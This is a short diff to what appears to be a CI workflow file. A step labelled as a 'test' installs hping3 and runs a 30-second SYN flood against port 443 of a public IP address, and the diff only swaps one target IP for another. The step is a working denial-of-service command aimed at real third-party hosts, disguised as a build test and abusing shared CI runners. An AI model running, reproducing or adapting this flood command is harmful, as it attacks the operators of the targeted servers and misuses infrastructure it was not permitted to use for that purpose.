@@ -21,4 +21,4 @@ jobs:
       - name: 测试
         run: |
           sudo apt install hping3 -q
-          sudo timeout 30s hping3 -S --flood -V -d 1400 -p 443 -s 1000-65535 47.243.69.11 || true
+          sudo timeout 30s hping3 -S --flood -V -d 1400 -p 443 -s 1000-65535 47.76.85.88 || true
